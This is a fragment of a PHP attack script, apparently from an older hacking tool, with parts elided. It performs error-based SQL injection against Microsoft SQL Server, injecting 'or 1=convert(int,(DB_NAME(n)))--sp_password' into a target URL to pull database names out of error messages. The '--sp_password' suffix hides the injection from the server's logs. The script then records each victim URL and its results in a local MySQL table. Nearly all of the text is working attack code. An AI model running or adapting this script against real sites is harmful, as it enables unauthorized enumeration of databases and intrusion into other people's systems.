...
$num_db=0;
$stop=false;
echo "\n<br><b>[+] Showing all databases current user has access too!</b><br>\n";
$resultats="\n[+] Showing all databases current user has access too!\n";
while(!$stop){
$url=$url_ori."+or+1=convert(int,(DB_NAME(".$num_db.")))--sp_password";
$dat = $cc->get("$url");
@eregi ("value '(.*)' to",$dat,$out);
$get_db=$out[1];
echo "[".$num_db."] ".$get_db."\n";
$resultats=$resultats."[".$num_db."] ".$get_db."\n";
$num_db=$num_db+1;
$get_db=convert($get_db);
$url_check=$url_ori."+or+1=convert(int,(DB_NAME(".$num_db.")))--sp_password";
$dat = $cc->get("$url_check");
@eregi ("value '(.*)' to",$dat,$out);
$check=$out[1];
	if (convert($check)==$get_db)
	{
		$stop=true;
	}
}
...
mysql_select_db("dz");
mysql_query("INSERT INTO dbs VALUES('','$url_ori', '$resultats', '$ip','$date')");
mysql_close();
?>